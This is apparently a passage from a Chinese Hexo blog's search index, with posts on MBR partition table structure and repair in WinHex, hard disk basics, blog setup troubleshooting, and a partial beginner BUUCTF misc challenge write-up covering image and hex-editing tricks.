title="最后两位是55AA，固定的"></a>最后两位是55AA，固定的</h2><h2 id="往前走64个字节是分区表，管理磁盘的分区"><a href="#往前走64个字节是分区表，管理磁盘的分区" class="headerlink" title="往前走64个字节是分区表，管理磁盘的分区"></a>往前走64个字节是分区表，管理磁盘的分区</h2><h2 id="再往前走4个字节是磁盘签名"><a href="#再往前走4个字节是磁盘签名" class="headerlink" title="再往前走4个字节是磁盘签名"></a>再往前走4个字节是磁盘签名</h2><h1 id="＊＊＊＊＊＊＊＊＊＊"><a href="#＊＊＊＊＊＊＊＊＊＊" class="headerlink" title="＊＊＊＊＊＊＊＊＊＊"></a>＊＊＊＊＊＊＊＊＊＊</h1><p>硬盘分区详解：<br>    硬盘分区表由四项组成，每项共１６个字节，共４＊１６＝＝６４个字节，每项描述一个分区的基本信息(80) (01 01 00) (07) (FE FF FF) (3F 00 00 00) (82 C1 3B 3A)<br>磁头，扇区，柱面</p><h1 id="＊＊＊＊＊存贮字节位＊＊＊＊＊＊"><a href="#＊＊＊＊＊存贮字节位＊＊＊＊＊＊" class="headerlink" title="＊＊＊＊＊存贮字节位＊＊＊＊＊＊"></a>＊＊＊＊＊存贮字节位＊＊＊＊＊＊</h1><h2 id="第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。"><a href="#第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。" class="headerlink" title="第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。"></a>第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。</h2><h2 id="第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中："><a href="#第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中：" class="headerlink" title="第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中："></a>第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中：</h2><pre><code>磁头号——第2字节；扇区号——第3字节的低6位；柱面号——为第3字节高2位+第4字节8位。第5字节分区类型符。00H——表示该分区未用（即没有指定）；06H——FAT16基本分区；0BH——FAT32基本分区；05H——扩展分区；07H——NTFS分区；0FH——（LBA模式）扩展分区（83H为Linux分区等）。</code></pre><h2 id="第6、7、8字节"><a href="#第6、7、8字节" class="headerlink" title="第6、7、8字节"></a>第6、7、8字节</h2><h2 id="本分区的结束磁头号、扇区号、柱面号。其中："><a href="#本分区的结束磁头号、扇区号、柱面号。其中：" class="headerlink" title="本分区的结束磁头号、扇区号、柱面号。其中："></a>本分区的结束磁头号、扇区号、柱面号。其中：</h2><pre><code>磁头号——第6字节；扇区号——第7字节的低6位；柱面号——第7字节的高2位+第8字节。</code></pre><h2 id="第9、10、11、12字节"><a href="#第9、10、11、12字节" class="headerlink" title="第9、10、11、12字节"></a>第9、10、11、12字节</h2><h2 id="逻辑起始扇区号-，本分区之前已用了的扇区数。"><a href="#逻辑起始扇区号-，本分区之前已用了的扇区数。" class="headerlink" title="逻辑起始扇区号 ，本分区之前已用了的扇区数。"></a>逻辑起始扇区号 ，本分区之前已用了的扇区数。</h2><h2 id="第13、14、15、16字节"><a href="#第13、14、15、16字节" class="headerlink" title="第13、14、15、16字节"></a>第13、14、15、16字节</h2><h1 id="本分区的总扇区数。"><a href="#本分区的总扇区数。" class="headerlink" title="本分区的总扇区数。"></a>本分区的总扇区数。</h1><h1 id="紫色的是分盘区，蓝色的是磁盘签名"><a href="#紫色的是分盘区，蓝色的是磁盘签名" class="headerlink" title="紫色的是分盘区，蓝色的是磁盘签名"></a>紫色的是分盘区，蓝色的是磁盘签名</h1><h1 id="磁盘签名可能会每一次打开都不一样，视情况而定"><a href="#磁盘签名可能会每一次打开都不一样，视情况而定" class="headerlink" title="磁盘签名可能会每一次打开都不一样，视情况而定"></a>磁盘签名可能会每一次打开都不一样，视情况而定</h1><h1 id="分区表："><a href="#分区表：" class="headerlink" title="分区表："></a>分区表：</h1><p>这里不同的分区我打上了不同的颜色书签，从磁盘签名往后空两个字节开始是磁盘分区的地方，<br>第三个扇区是逻辑扇区：EBR</p><h1 id="数据解释器：-第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小"><a href="#数据解释器：-第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小" class="headerlink" title="数据解释器： 第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小"></a>数据解释器： 第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小</h1><h1 id="磁盘总大小减去分区的起始扇区号-分区大小"><a href="#磁盘总大小减去分区的起始扇区号-分区大小" class="headerlink" title="磁盘总大小减去分区的起始扇区号 == 分区大小"></a>磁盘总大小减去分区的起始扇区号 == 分区大小</h1><h1 id="概要："><a href="#概要：" class="headerlink" title="概要："></a>概要：</h1><pre><code>1：创建一个新的磁盘2：将新建磁盘的MBR赋值到被破坏的磁盘的MBR3：修改被破坏的磁盘的MBR磁盘签名（只需要和复制的不一样即可）４：找到该磁盘第一个分区的起始扇区５：从该起始扇区得知文件系统，起始扇区号，分区大小6:将这些数据填入MBR的分区表中７：保存，在磁盘管理出进行刷新</code></pre>]]></content>
      
      
      <categories>
          
          <category> 文件修复 </category>
          
          <category> winhex </category>
          
          <category> 进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件修复 </tag>
            
            <tag> winhex </tag>
            
            <tag> 进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>硬盘基本知识</title>
      <link href="/%E7%A1%AC%E7%9B%98%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
      <url>/%E7%A1%AC%E7%9B%98%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="硬盘基本知识"><a href="#硬盘基本知识" class="headerlink" title="硬盘基本知识"></a>硬盘基本知识</h1><h2 id="硬盘由５部分组成："><a href="#硬盘由５部分组成：" class="headerlink" title="硬盘由５部分组成："></a>硬盘由５部分组成：</h2><ol><li>盘片，磁头，磁道，扇区，柱面</li><li>盘片 片面 和 磁头<br>硬盘中一般会有多个盘片组成，每个盘片包含两个面，每个盘面都对应地有一个读/写磁头。受到硬盘整体体积和生产成本的限制，盘片数量都受到限制，一般都在5片以内。盘片的编号自下向上从0开始，如最下边的盘片有0面和1面，再上一个盘片就编号为2面和3面。<br><img src="https://upload-images.jianshu.io/upload_images/2843224-46fb935cd31addbd.png"><br>扇区 和 磁道<br>下图显示的是一个盘面，盘面中一圈圈灰色同心圆为一条条磁道，从圆心向外画直线，可以将磁道划分为若干个弧段，每个磁道上一个弧段被称之为一个扇区（图践绿色部分）。扇区是磁盘的最小组成单元，通常是512字节。（由于不断提高磁盘的大小，部分厂商设定每个扇区的大小是4096字节）<br><img src="https://upload-images.jianshu.io/upload_images/2843224-56f2056f0b36009f.png"><br>编号是：从下到上依次递增，最下面是０<pre><code> 从外到内依次递增，最外面是０</code></pre><h2 id="磁盘容量计算"><a href="#磁盘容量计算" class="headerlink" title="磁盘容量计算"></a>磁盘容量计算</h2></li><li>存储容量 ＝ 磁头数 × 磁道(柱面)数 × 每道扇区数 × 每扇区字节数<br>磁头数：硬盘总共有几个磁头，也就是有几面盘片，最大为２５５；２５６－１<br>柱面数：每一面磁片上有几条磁道，最大为１０２３；１０２４－１<br>扇区数：每一条磁道上有几个扇区，最大为６３，每一个扇区的角度就是３６０/扇区数；６４－１<br>综上，欸，我们可以求最大容量了：<br>255 * 1023 * 63 * 512 / 1048576 = 8024 GB ( 1M =1048576 Bytes )<h2 id="硬盘坏道"><a href="#硬盘坏道" class="headerlink" title="硬盘坏道"></a>硬盘坏道</h2></li><li>硬盘中的部分数据无法使用或者使用出现了异常。更标准的说法为坏扇区而不是坏扇道，因为磁盘的最小寻址单位是扇区而不是磁道</li></ol><h1 id="数据的存储原理"><a href="#数据的存储原理" class="headerlink" title="数据的存储原理"></a>数据的存储原理</h1><ol><li>信息存储在硬盘中，硬盘是由很多的盘片构成的，通过盘片表面的磁性物质来存储数据</li><li>凸起的地方被磁化，代表数字1，凹的地方没有被磁化，代表数字0，因此硬盘可以以二进制的形式来存储文字，图片等信息</li></ol>]]></content>
      
      
      <categories>
          
          <category> 文件修复 </category>
          
          <category> 定于 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件修复 </tag>
            
            <tag> 定义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建博客过程中常见的问题</title>
      <link href="/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
      <url>/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="博客搭建过程中常见问题"><a href="#博客搭建过程中常见问题" class="headerlink" title="博客搭建过程中常见问题"></a>博客搭建过程中常见问题</h1><h2 id="spawn-error"><a href="#spawn-error" class="headerlink" title="spawn error"></a>spawn error</h2><ol><li>需要改config文件下的repo<h2 id="改写ssh密钥"><a href="#改写ssh密钥" class="headerlink" title="改写ssh密钥"></a>改写ssh密钥</h2></li><li>删掉C盘用户中的.ssh文件</li><li>ssh-keygen -t rsa -C <a href="mailto:&#120;&#x78;&#x78;&#120;&#64;&#113;&#113;&#46;&#99;&#x6f;&#x6d;">&#120;&#x78;&#x78;&#120;&#64;&#113;&#113;&#46;&#99;&#x6f;&#x6d;</a> 一定要加上邮箱！！！</li><li>再次打开.ssh文件（用啥都行，有一次直接IE都能打开）</li><li> <img src="https://s4.ax1x.com/2021/12/05/oDfnE9.png"><h2 id="主题无法上传但是本地可以"><a href="#主题无法上传但是本地可以" class="headerlink" title="主题无法上传但是本地可以"></a>主题无法上传但是本地可以</h2></li><li>一定一定一定要修改blog文件中的_config.yml文件中的URL，将其替换为自己博客的地址！！！！！！</li><li><img src="https://s4.ax1x.com/2021/12/05/oDhdZ4.png"></li><li>就是这个地方</li></ol>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf前几个杂项</title>
      <link href="/%E6%9D%82%E9%A1%B9/"/>
      <url>/%E6%9D%82%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="杂项专题"><a href="#杂项专题" class="headerlink" title="杂项专题"></a>杂项专题</h1><h2 id="第一题签到题目"><a href="#第一题签到题目" class="headerlink" title="第一题签到题目"></a>第一题签到题目</h2><ol><li>直接复制粘贴即可<img src="https://s4.ax1x.com/2021/12/05/oDdWVO.png"><h2 id="第二题金三胖"><a href="#第二题金三胖" class="headerlink" title="第二题金三胖"></a>第二题金三胖</h2></li><li>使用gitsplitter(我使用的是2.0版本)逐帧分解</li><li>这个好像要归到隐写术里</li><li>注意是he110，如果不确定是1还是L可以都试一下</li><li><img src="https://s4.ax1x.com/2021/12/05/oDwEoF.png"></li><li><img src="https://s4.ax1x.com/2021/12/05/oDwmW9.png"></li><li><img src="https://s4.ax1x.com/2021/12/05/oDweJJ.png"><h2 id="第三题二维码"><a href="#第三题二维码" class="headerlink" title="第三题二维码"></a>第三题二维码</h2></li><li>我使用的是闪电二维码识别器，看页面已经比较老了</li><li><img src="https://s4.ax1x.com/2021/12/05/oDdMVS.png"></li><li>扫描后发现是secret is here,报上flag{}后发现不对，欸怎么办呢</li><li>王大佬提醒不要太注意图片本身，欸，</li><li>我用熟悉的winhex试了试，发现非活动区竟然不是00或者80(00是非活动区，80为活动区)发现不对</li><li>我最后爆破发现可以得到答案<img src="https://s4.ax1x.com/2021/12/05/oDwRln.png"><h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2></li><li>尚未解出<h2 id="第五题大白-好像在说我。。。"><a href="#第五题大白-好像在说我。。。" class="headerlink" title="第五题大白(好像在说我。。。)"></a>第五题大白(好像在说我。。。)</h2></li><li>题目有很清楚的提示，一下就可以想到使用winhex来调高列的长度</li><li>注意，不懂的可以以后关注我的博客，我将更新winhex的基础知识，这个地方第二行前四个十六进制位为列的宽度，后四个为列的长度<img src="https://s4.ax1x.com/2021/12/05/oDD7tS.png"></li><li>保存后再打开发现，欸，有了<img src="https://z3.ax1x.com/2021/05/23/gXIsc8.png"><h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h2><h2 id="第七题文件中的秘密"><a href="#第七题文件中的秘密" class="headerlink" title="第七题文件中的秘密"></a>第七题文件中的秘密</h2></li><li><img src="https://s1.ax1x.com/2021/12/10/ooaJ0K.png"></li><li>发现是一个图片题，没有像大白之类的题一样是缩放或者隐写术之类的，我试了试用winhex打开后文本查找flag字样，发现flag</li><li>路飞，儿时的信仰<img src="https://s1.ax1x.com/2021/12/10/oodQUS.png"><h2 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h2><h2 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a>第九题</h2><h2 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a>第十题</h2><h2 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a>第十一题</h2><h2 id="第十二题"><a href="#第十二题" class="headerlink" title="第十二题"></a>第十二题</h2><h2 id="第十三题"><a href="#第十三题" class="headerlink" title="第十三题"></a>第十三题</h2><h2 id="第十四题"><a href="#第十四题" class="headerlink" title="第十四题"></a>第十四题</h2><h2 id="第十五题"><a href="#第十五题" class="headerlink" title="第十五题"></a>第十五题</h2></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
